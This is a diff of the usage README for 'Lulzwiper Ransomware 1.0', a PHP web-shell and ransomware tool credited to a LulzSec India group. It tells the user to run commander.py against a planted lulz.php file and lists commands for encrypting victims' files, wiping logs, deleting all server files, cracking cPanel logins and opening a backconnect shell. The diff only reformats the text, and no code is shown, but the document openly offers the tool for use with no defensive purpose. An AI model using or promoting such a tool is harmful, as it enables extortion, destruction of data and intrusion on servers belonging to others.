@@ -7,12 +7,21 @@ how to use
 2.run commander.py enter the full path to lulz.php file
 DOne!!!
  
+contact us : https://www.facebook.com/LulzSecIndiaOfficial/
+                                                                   
  
 Encrypt files = cry
+
 Decrypt files = decry                                                                            
-upload files = upload                                                                            Lulzwiper Ransomware 1.0
-remove log = logfucker                                                                           contact us = https://www.facebook.com/LulzSecIndiaOfficial/
-Delete all files = fuckserver                                                                    coded by = script1337  
+
+upload files = upload                                                                            
+
+remove log = logfucker                                                                           
+
+Delete all files = fuckserver                                                                    
+
 check if cpanel can be creck = ccheck
+
 creck cpanel =  creckzee  
+
 backconnect = backconnect
